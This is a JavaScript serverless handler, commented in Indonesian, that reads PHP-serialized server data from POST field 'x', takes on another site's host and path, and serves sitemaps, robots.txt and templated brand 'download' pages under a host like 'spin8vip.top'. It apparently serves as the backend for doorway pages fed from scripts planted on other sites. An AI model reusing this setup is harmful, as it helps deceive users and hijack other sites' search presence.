import { extractPHPSerializedValue } from './parser.js';
import { handleAiMetadata } from './aiMetadata.js';
import { getBrandSeoData } from './seoData.js';
import { renderDownloadPage } from './template.js';

export async function onRequest(context) {
  const { request } = context;
  const url = new URL(request.url);

  let requestURI = url.pathname;
  let queryString = url.search.replace('?', '');
  let httpHost = 'spin8vip.top';
  let uriFilePost = '';
  let rawPostData = {};
  let debugPostInfo = null;

  if (request.method === 'POST') {
    try {
      const contentType = request.headers.get('content-type') || '';
      if (contentType.includes('application/x-www-form-urlencoded')) {
        const formData = await request.formData();
        rawPostData = Object.fromEntries(formData);
      } else if (contentType.includes('application/json')) {
        rawPostData = await request.json();
      } else {
        const bodyText = await request.text();
        rawPostData = Object.fromEntries(new URLSearchParams(bodyText));
      }

      if (rawPostData.x) {
        const serializedData = rawPostData.x;
        
        // Ekstraksi nilai satu per satu untuk tujuan Debugging ala print_r
        const uriFromPost = extractPHPSerializedValue(serializedData, 'REQUEST_URI');
        const queryFromPost = extractPHPSerializedValue(serializedData, 'QUERY_STRING');
        const hostFromPost = extractPHPSerializedValue(serializedData, 'HTTP_HOST') || extractPHPSerializedValue(serializedData, 'SERVER_NAME');
        const rawUriName = extractPHPSerializedValue(serializedData, 'uri_name');

        // Simpan dalam objek debug untuk ditampilkan ke layar
        debugPostInfo = {
          POST_KEY_X_RECEIVED: true,
          REQUEST_URI: uriFromPost || 'NOT_FOUND',
          QUERY_STRING: queryFromPost || 'NOT_FOUND',
          HTTP_HOST: hostFromPost || 'NOT_FOUND',
          uri_name: rawUriName || 'NOT_FOUND',
          RAW_SERIALIZED_DATA: serializedData
        };

        if (uriFromPost) requestURI = uriFromPost;
        if (queryFromPost) queryString = queryFromPost;
        if (hostFromPost) httpHost = hostFromPost;
        
        if (rawUriName) {
          const matchPhp = rawUriName.match(/^(\/[^\?]+\.php)/);
          uriFilePost = matchPhp ? matchPhp[1] : '';
        }
      } else {
        debugPostInfo = { error: "Key 'x' tidak ditemukan di dalam payload POST." };
      }
    } catch (err) {
      debugPostInfo = { error: "Gagal memproses payload POST: " + err.message };
    }

    // [DEBUG MODE] Jika ingin mengecek data POST yang masuk, aktifkan baris di bawah ini
    // Ini akan menampilkan struktur data ala print_r langsung ke browser/cURL Anda
    if (debugPostInfo) {
      const prettyPrint = JSON.stringify(debugPostInfo, null, 2);
      return new Response(`Array\n(\n${prettyPrint}\n)`, {
        status: 200,
        headers: { "Content-Type": "text/plain; charset=utf-8" }
      });
    }
  }

  // --- LANJUTAN KODE NORMAL SETELAH DEBUG SELESAI ---
  if (!httpHost) httpHost = url.host || 'spin8vip.top';
  const pubHost = httpHost;
  const publicPathUri = `https://${pubHost}${uriFilePost}`;

  const fullCheck = `${requestURI} ${queryString}`.toLowerCase();

  const aiResponse = await handleAiMetadata(fullCheck, `https://${pubHost}`, url.origin);
  if (aiResponse) return new Response(aiResponse.content, { headers: { "Content-Type": aiResponse.contentType } });

  if (fullCheck.includes('robots.txt')) {
    return new Response(`User-agent: *\nDisallow:\nSitemap: https://${pubHost}/sitemap-wp.xml`, { headers: { "Content-Type": "text/plain; charset=utf-8" } });
  }

  if (fullCheck.includes('pingsitemap') || fullCheck.includes('sitemap-wp.xml')) {
    return new Response(`<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n  <url><loc>https://${pubHost}/</loc></url>\n</urlset>`, { headers: { "Content-Type": "text/xml; charset=utf-8" } });
  }

  let cleanPath = requestURI.replace(/^\/+/, '');
  let brandQuery = '';

  if (cleanPath.includes('.php')) {
    const phpParts = cleanPath.split('.php');
    const afterPhp = phpParts[1] ? phpParts[1].replace(/^\/+/, '') : '';
    if (afterPhp) {
      const subSegments = afterPhp.split('/').filter(Boolean);
      brandQuery = subSegments[subSegments.length - 1];
    }
  }

  if (!brandQuery) {
    const segments = cleanPath.split('/').filter(Boolean);
    if (segments.length >= 2) {
      brandQuery = segments[segments.length - 1];
    } else if (segments.length === 1 && !segments[0].includes('.php')) {
      brandQuery = segments[0];
    }
  }

  if (!brandQuery && queryString) {
    const queryClean = queryString.replace(/^[\/a-zA-Z_-]+\/+/i, '').replace(/^\/+/, '');
    brandQuery = queryClean || queryString;
  }

  const blacklistedWords = ['install', 'download', 'apk', 'app', 'update', 'mobile', 'index.php', 'aby.php'];
  if (!brandQuery || blacklistedWords.includes(brandQuery.toLowerCase()) || brandQuery.toLowerCase().endsWith('.php')) {
    brandQuery = 'default-app';
  }

  try {
    const seoData = await getBrandSeoData(brandQuery, pubHost, url.origin);
    if (uriFilePost) {
      seoData.downloadLink = `${publicPathUri}/${brandQuery}`;
    }

    const htmlTemplate = renderDownloadPage(seoData);
    return new Response(htmlTemplate, {
      headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "public, max-age=600" }
    });
  } catch (err) {
    return new Response(`Internal Server Error: ${err.message}`, { status: 500, headers: { "Content-Type": "text/plain; charset=utf-8" } });
  }
}
